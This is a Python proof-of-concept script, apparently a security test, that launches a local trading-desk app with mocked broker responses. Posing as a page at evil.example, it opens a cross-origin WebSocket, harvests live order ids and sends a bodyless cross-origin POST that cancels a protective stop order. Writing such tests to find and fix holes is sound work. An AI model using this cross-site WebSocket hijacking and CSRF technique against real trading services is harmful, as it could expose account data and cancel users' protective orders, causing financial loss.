"""End-to-end: hostile-origin WS -> harvest live order ids -> bodyless cross-origin cancel."""
import sys, os, threading, time, socket, json, base64, struct
sys.path.insert(0, "/home/user/ai-day-trader-agent")
os.environ.pop("DESK_TOKEN", None)
os.environ["ALPACA_API_KEY"]="PKTEST"; os.environ["ALPACA_SECRET_KEY"]="s"; os.environ["ALPACA_API_SECRET"]="s"
os.environ["ALPACA_TRADING_BASE_URL"]="https://api.alpaca.markets"
os.environ["ALPACA_LIVE_TRADING"]="true"          # operator opted into REAL MONEY
os.environ.pop("DESK_DEMO_MODE", None)            # NOT demo: a real account snapshot
os.environ["DESK_ACCOUNT_INTERVAL"]="3"
os.environ["NEWS_API_KEY"]="x"
import requests
def boom(*a, **k): raise AssertionError("REAL NETWORK ATTEMPTED %r" % (a,))
requests.request = requests.get = requests.post = requests.delete = boom
from trader import alpaca, market_feed
CALLS=[]
def rec(method, path, **kw):
    CALLS.append((method, path))
    if path.endswith("/v2/account"):
        return {"equity":"184320.55","last_equity":"186001.10","cash":"12000","buying_power":"24000",
                "status":"ACTIVE","daytrade_count":1}
    if path.endswith("/v2/positions"):
        return [{"symbol":"NVDA","qty":"400","side":"long","avg_entry_price":"181.20",
                 "current_price":"176.05","market_value":"70420","unrealized_pl":"-2060","unrealized_plpc":"-0.0284"}]
    if "/v2/orders" in path and method=="GET":
        return [{"id":"9b1f2c44-7e55-4a01-8d2e-1f0ab3c99e77","client_order_id":"adt-auto-1",
                 "symbol":"NVDA","side":"sell","qty":"400","filled_qty":"0","type":"stop",
                 "order_class":"bracket","status":"new","stop_price":"175.76",
                 "submitted_at":"2026-10-13T13:31:02Z"}]
    if path.endswith("/v2/clock"): return {"is_open":True,"next_close":"2026-10-13T20:00:00Z"}
    return {}
alpaca._request = rec
market_feed.get_quotes = lambda syms: {}

import uvicorn
from trader.desk import create_app
app = create_app(background=True, start_agents=False)   # background loops ON, agents OFF
cfg = uvicorn.Config(app, host="127.0.0.1", port=8732, log_level="error")
srv = uvicorn.Server(cfg); threading.Thread(target=srv.run, daemon=True).start()
for _ in range(100):
    try: s=socket.create_connection(("127.0.0.1",8732),0.2); s.close(); break
    except OSError: time.sleep(0.1)

def read_frames(sock, seconds):
    sock.settimeout(seconds); buf=b""; t=time.time()
    while time.time()-t < seconds:
        try: b=sock.recv(65536)
        except Exception: break
        if not b: break
        buf+=b
    msgs=[]; i=0
    while i < len(buf):
        if buf[i] != 0x81: break
        ln = buf[i+1]
        if ln < 126: data=buf[i+2:i+2+ln]; i+=2+ln
        elif ln==126:
            n=struct.unpack(">H", buf[i+2:i+4])[0]; data=buf[i+4:i+4+n]; i+=4+n
        else:
            n=struct.unpack(">Q", buf[i+2:i+10])[0]; data=buf[i+10:i+10+n]; i+=10+n
        try: msgs.append(json.loads(data))
        except Exception: pass
    return msgs

print("=== STEP 1: attacker page at https://evil.example opens ws://127.0.0.1:8732/ws/desk ===")
key = base64.b64encode(os.urandom(16)).decode()
ws = socket.create_connection(("127.0.0.1",8732),3)
ws.sendall(("GET /ws/desk HTTP/1.1\r\nHost: 127.0.0.1:8732\r\nUpgrade: websocket\r\n"
            "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n"
            "Origin: https://evil.example\r\n\r\n" % key).encode())
time.sleep(0.4)
hs = ws.recv(4096)
print("handshake:", hs.split(b"\r\n")[0].decode())
msgs = read_frames(ws, 8)
harvested=None
for m in msgs:
    d = m.get("data") or {}
    print("  <- msg type=%s" % m.get("type"))
    if m.get("type")=="account" or (m.get("type")=="hello" and d.get("account")):
        acct = d if m.get("type")=="account" else d["account"]
        print("     equity :", (acct.get("account") or {}).get("equity"))
        print("     mode   :", acct.get("mode"))
        print("     positions:", [(p["symbol"],p["qty"],p["unrealized_pl"]) for p in acct.get("positions",[])])
        for o in acct.get("orders",[]):
            print("     OPEN ORDER id=%s %s %s %s %s" % (o["id"],o["symbol"],o["side"],o["type"],o["status"]))
            harvested = o["id"]
print("\nHARVESTED protective stop order id:", harvested)

print("\n=== STEP 2: bodyless cross-origin POST cancel (a no-cors simple request) ===")
assert harvested
CALLS.clear()
c = socket.create_connection(("127.0.0.1",8732),3)
c.sendall(("POST /api/desk/orders/%s/cancel HTTP/1.1\r\nHost: 127.0.0.1:8732\r\n"
           "Origin: https://evil.example\r\nContent-Length: 0\r\nConnection: close\r\n\r\n" % harvested).encode())
time.sleep(0.8); print(c.recv(4096).split(b"\r\n\r\n")[0].split(b"\r\n")[0].decode())
print("broker calls made:", CALLS)
srv.should_exit=True
